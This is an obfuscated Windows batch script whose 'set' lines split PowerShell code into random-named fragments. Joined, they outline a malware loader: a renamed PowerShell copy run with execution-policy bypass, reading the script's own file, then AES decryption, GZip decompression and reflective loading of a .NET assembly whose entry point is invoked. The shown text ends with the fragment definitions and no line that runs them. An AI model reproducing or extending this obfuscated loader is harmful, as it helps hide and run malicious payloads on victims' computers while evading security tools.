@echo off
set "ULDcMqGzOy=rS"
set "DmjYuAvsGl=Sy"
set "ezlXCbwomn=32"
set "idEyTXysCq=y "
set "CHIsGFyHKC=he"
set "XLpnDDiNyH=1."
set "fBhCVTwgsZ=0\"
set "oGmHOxUTxD=ow"
set "GLOQThaThe=Wi"
set "kRffnEjSfi=we"
set "DspSIbTBTc=rs"
set "mlJTWMfvlk=:\"
set "CAnhlwQFig=in"
set "aprGUDSQXu=ll"
set "rLEYifMpsc=he"
set "iunlwSChrU=.e"
set "hVldJtWpda=co"
set "NBIrFBKbTg=we"
set "HbZtAcXKjz=xe"
set "OvJRgnbJYf= /"
set "JDNupujweW=py"
set "aysugyebCU=do"
set "ngvDPnAWal=em"
set "cBmmGYNfXp=\W"
set "AuZKJDleMf=Po"
set "kRZaVADSvS=po"
set "DlUNsMUjXQ=ws"
set "mapwKMfOAO=ll"
set "XqZfWazgbv=st"
set "DbePWORWYt=\v"
set "NvgwGDfqdw= C"
set "pNkTqbHpDy=s\"
set "bLQqnLOOwg=nd"
set "ZOCvqyaYlO=cd"
set "qbNLhrHtqC= %~dp0"
set "QPwAVOUGnt=rtS4"
set "utLjHfBCga=thWU"
set "faYIShJlVD=onve"
set "QWqbovXkMX=]::("
set "eJqzDyyfEp=..-1"
set "zGLsuQbVcp=);$D"
set "wXINGRSYCj=vSku"
set "NAPQfzocfO= New"
set "mBuqNTfCjM= [Sy"
set "uukmRycPGR=null"
set "xjdQnLagxl=pher"
set "BQkewRsvBs=PKCS"
set "OoDxNlUayC=.Ass"
set "PasezQUvHq=.Mod"
set "jdqKUDPEAz=LIrI"
set "IlshOQmMwW=yste"
set "LqqQsPGQua=t Sy"
set "dwGjuozSut=IyX "
set "GiEEjIauFS='gni"
set "TLfhhqXYhr=rt]:"
set "BZChEbNtwE=IrIz"
set "dccuDnyBsj=.Len"
set "GsXMGjpqVC=1] -"
set "rKbLYSssGj=]::C"
set "NkZixRdzFQ=g = "
set "ZxOjMPnmPl=comm"
set "xDzzsWdcGd=3HWs"
set "kCMAvqgcZN=.IO."
set "hTlhSekuER=Star"
set "dZBMImAYch=ring"
set "jKQjBfjddO=Zr.I"
set "uBSPJgTeVv=grap"
set "QkuRyUQdAo=);$H"
set "hLSSXgmQjB=em.I"
set "eLwGNOGKTY=;$rs"
set "MNzLUNYyts='dqR"
set "kmywVXOSiO=VE);"
set "emQgxOLkWv=eam("
set "LPWDgNQcwd=OyzA"
set "GRkgjMDVRW=  $M"
set "GLmaMdAbKp=$DbS"
set "fnISneRare=vj0m"
set "KVuceKwvpK=('%~f0'"
set "SxZyMKPUVx='txe"
set "RavTIqnipG=)($L"
set "EnhoRFCuKa=y]::"
set "mhhkQpNDJc=m.IO"
set "PYJcCnhgfk=).Sp"
set "xVXOxQLWeI=Fina"
set "LcnIJustrD=yste"
set "jEVJHOzGWS=$LIr"
set "ltGFlTdbQK=[IO."
set "SHlPSNwzfJ=[Env"
set "ijGubADEHh=bSRC"
set "VijgZFTqmk=tion"
set "uAGBfiJvwU=PoXZ"
set "JibMrRuFSG=raph"
set "KavRJsvBFu=ionM"
set "OxRJawdEzI= = $"
set "UQRrPmzLpA=ay()"
set "ICccHnYvVZ=X.Su"
set "nIWjlVULqZ=ck($"
set "rvRdMFzpyJ=ode]"
set "dtiVUfoEFl='[-1"
set "ahIMQvWPRm=ptog"
set "aHBfblyUYL=:: '"
set "SPVWikxbVD=ateD"
set "zVpQTYLNuL=.Cre"
set "LALOUoovNj=16] "
set "XnseYReUvu=se()"
set "MdCwjSdUQh=TllA"
set "goTZyquDOh=.Com"
set "JFtTkmXyAo=Secu"
set "rbgOGtYVvP=stem"
set "RAgnObVPXF=::('"
set "hmiHPHyABu=BC;$"
set "igJlmRfxBh= = N"
set "LiOpgGnJHk=y.Ci"
set "wfvhejwuVp=QAIy"
set "sVehhRSOiy===')"
set "wAeQZsyaBd=V = "
set "aCZoqoxwSM=ect "
set "KukyZoEUkm=-Obj"
set "BoaWkEsGdf=ypto"
set "zgIfcMatxO=tem."
set "ZiMfzfwwzS=oint"
set "TtGsTobgMO=);$P"
set "CndrVTDmWq=File"
set "eAsujdzuaU=tem."
set "ldRSalFYHS=oXZr"
set "WwEsHztNSv=nirt"
set "GWLFnHBNHE=bjec"
set "cKdaOpXKno=Conv"
set "mnwwEjicGY=ress"
set "TZdZSIdnWg=gth)"
set "JIMcnvMNZI=rity"
set "MecWIibClB=LSKu"
set "NlKbXCcHaN=qzVE"
set "OFENbTLzwQ=gnir"
set "FazjdlXZUp=$rsO"
set "GUZzPtkmUk=::De"
set "SJTnHzsqFK=rity"
set "ugYJNmueYE=.Sec"
set "epbtevRXVW=tsWi"
set "aHDxQNcoiK=rofi"
set "gBacOOZNDB=, $L"
set "LEvIZnAmLy=tS46"
set "oIOIzrJjhC='')("
set "sRSnvEmWxF=comp"
set "btDPjpbTog=ion."
set "qDQfnwMdSq=in $"
set "sgdmOusANI=oXZr"
set "kphqLAOjCC=bypa"
set "jWhNRJKFJC=Obje"
set "mSAODLCfEQ=flec"
set "kQrKBhtLeN=yste"
set "dPbeGwhMzI=orF'"
set "kYPDWBDPmN=esaB"
set "UOUxIqIgac=();$"
set "uCIlsoWsNs=S46e"
set "VMgPSNisSv=r.Pa"
set "vroAvhOcJS=v4Ir"
set "QCHbYpjVIH=oL'["
set "gwVQUGLUlO=Obje"
set "tDJkFRNUhm=($QA"
set "QavZMvExBM=ptor"
set "VZGfzQLyWK=IrIz"
set "miaNlaAPfz=F'[-"
set "gjSevKLbnV=oin "
set "jxOvPfGHrH=oXZr"
set "lzFWqXeYQC=7;$P"
set "IJjognfxoA='[-1"
set "apIbyPbReY=[Sys"
set "QUZazvNXHI=$Hqz"
set "UMWEhMxlTW=)($M"
set "wtxSVRtVjN=z = "
set "LLgRWeJtnO=.-16"
set "qwoaJJytDJ=k; }"
set "dIuTQxNWsT=LSKu"
set "QzQOUXpcar=('da"
set "DqUhxquoIp=$Hqz"
set "BbBNiJmNTd=]::("
set "qrPWvoLhYM=urit"
set "yJarJHfmMK=stem"
set "UqwditJhkI=+hAO"
set "cnCPZcGgpB=-joi"
set "amtPEMOozA=y.Pa"
set "HLlTFuoqDz=Invo"
set "NjlHsEAEFV=] -j"
set "hSQGkZFVaW=ddin"
set "BwpiQScyfB=VE ="
set "PGXeAemHoi=and "
set "OLBKFJPdZI=m.Re"
set "cdOlyYHHRM=.Mem"
set "BukpNvDSVS=New-"
set "UbiRoTHCTY=lBlo"
set "SVdmZXkhHz=ach "
set "KCjCwNOEfg=$Hqz"
set "ZMHoYZCAby=; };"
set "zMtXpfXodL=rans"
set "rajscbqSLR=esMa"
set "soBXmVMoXt=.Con"
set "yAqLXKBHkI=VE.T"
set "vUtfTBOulM=.Dis"
set "DbvdEgYCyB=z.En"
set "nTLKSFwgJQ=m(, "
set "VtoLxgzWgS=)) {"
set "JzpyMsOjtA=-4] "
set "szJMexUGwj=[]] "
set "IwOzrSieOl=C = "
set "vYDJkHEKAo=$vSk"
set "xAfXyHKjOc=Vna."
set "gUhoyxjnjt=.GZi"
set "aDsRNvLVOX=)))"
set "AIdyuQQaQz=..-1"
set "vmHxkqqHVK=, (,"
set "hGIANmXrMs=DG.T"
set "jHiqUYWkbb=ress"
set "XTVMfXVuVG=y.Cr"
set "LJDnCmAXFL=m.IO"
set "xIhIDjbYsL=daeR"
set "wnrWrhLGdM=Disp"
set "VYoZMAllDQ=hy.A"
set "wkaNshaHkB=nxz "
set "bubZJcRIhI=hVna"
set "QtEsUhBwRS=;$th"
set "uiMIzlihrK=morF"
set "KCdGAJEKIc=ke($"
set "wGMdKAquit=n ''"
set "UaZfLdNlNl=);$k"
set "weZtqEeatB=Iz ="
set "VhtjpGFjSy=n ''"
set "LNFJFeUbWk=Iz);"
set "PsqtYwXzJQ=6esa"
set "xrMojPMDWi= if "
set "uuXaJjigmK=le  "
set "JeDopewLmu=oXZr"
set "eJbRPgNTDC=($QA"
set "fSOLcwoTSL=a) {"
set "sHAndruREl=ddin"
set "MBXvprWqwV=sGUc"
set "yHOVjeGhkP=pDZz"
set "xXiMpnhMIR=trea"
set "PDJfYpCzgJ=DbSR"
set "VfeSswafcZ=nage"
set "tPtzElSzyx=pose"
set "CQSphdinhz=pres"
set "XXYkaogESj= = $"
set "suqsyrCurs=736u"
set "LnpOhHeTjR=:('g"
set "OWysFUqkSF=$LIr"
set "hmjQxFgfQk=;$LN"
set "yMkFjVxzwP= [st"
set "HdMvSiMTjP=]::N"
set "bBABfNcOfT=;$kh"
set "aOFkaVRngy=pStr"
set "DfIFKLfATF=yTo("
set "kemOPwjpfo=tryP"
set "jvZjepKgqj=Stre"
set "IZxAMBSbvl=isfL"
set "XcEvHfFjOl=0O+g"
set "ANSdmSchPl=.Dis"
set "NSRlhKMXrb=Secu"
set "uoWzgaxuMV=ct S"
set "bpDhdjuBvK=7Yiv"
set "qEYXneyGzA=ODG."
set "QIawndzOlg=ewLi"
set "kVHtRrGmKN=ispo"
set "MWXEzQaqiF=LNnx"
set "QyzVeMBYEW=ua ="
set "sDDmUJSagU=bstr"
set "RKRMzgamem=Fo7l"
set "DbbZDvueVa=;$rs"
set "vBqkoxOfcR=IyX."
set "pdwoDKeSju=WUe."
set "MydFpkQqUH=oXZr"
set "uCCCsUQsUb=oArr"
set "zgiEMzBJHz=e = "
set "uajuQbcUIq=z, 0"
set "eudXTmNgPl==');"
set "UUdNzyNsHh=Ue, "
set "FHNgYVDodh=Comp"
set "cwOrHWRcAs=pose"
set "tXPYDIkEcV=('%*'"
set "JHzzaIIERJ=$thW"
set "BrXshoSlFM=1..-"
set "FZdIzYnmOH=ing("
set "URNkfSLkBk=saBm"
set "QKcQcqfKFD=ptog"
set "PJoLoVRpXW=LIrI"
set "KlurIEYvrd=-ep "
set "CREzLhdsJT=lit("
set "qcivYcaqkU=gMod"
